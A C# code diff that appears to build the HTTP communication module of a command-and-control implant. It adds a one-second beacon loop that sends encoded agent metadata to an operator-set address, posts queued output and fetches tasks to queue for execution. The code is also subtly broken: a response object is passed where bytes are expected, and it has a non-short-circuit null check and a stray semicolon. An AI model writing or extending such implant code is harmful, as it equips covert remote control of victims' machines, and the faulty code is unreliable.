@@ -29,28 +29,81 @@ namespace Agent.Models
             base.Init(metadata);
 
             _client = new HttpClient();
-            _client.BaseAddress = new System.Uri($"{ConnectAddress}:{ConnectPort}");
+            _client.BaseAddress = new Uri($"{ConnectAddress}:{ConnectPort}");
             _client.DefaultRequestHeaders.Clear();
 
+            var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialise());
 
+            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
         }
 
-        public override Task Start()
+        public override async Task Start()
         {
 
             _tokenSource = new CancellationTokenSource();
 
             while (!_tokenSource.IsCancellationRequested)
-            { 
+            {
+
+                //check to see if we have data to send 
+                if (!Outbound.IsEmpty)
+                {
+                    await PostData();
+
+                }
+
+                else
+                {
+                    await CheckIn();
+                
+                }
+
+                //Sleep for 1 sec
+                await Task.Delay(1000);
+
+
                 //checkin
                 // get tasks
                 // sleep 
             }
         }
 
-        private void CheckIn()
-        { 
+
+        private async Task PostData()
+        {
+
+            var outbound = GetOutbound()
+                .Serialise();
+
+            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
+            var response = await _client.PostAsync("/", content);
+            var responseContent = await response.Content.ReadAsByteArrayAsync();
+
+            HandleResponse(response);
+        }
+
+
+
+
+        private async Task CheckIn()
+        {
+            var response = await _client.GetByteArrayAsync("/");
+            HandleResponse(response);
+        
+        }
+
+        private void HandleResponse(byte[] response)
+        {
+            var tasks = response.Deserialize<AgentTask[]>();
+            if (tasks != null & tasks.Any())
+            {
+                foreach (var task in tasks)
+                {
+                    Inbound.Enqueue(task);
+;                
+                }
             
+            }
         
         }
 
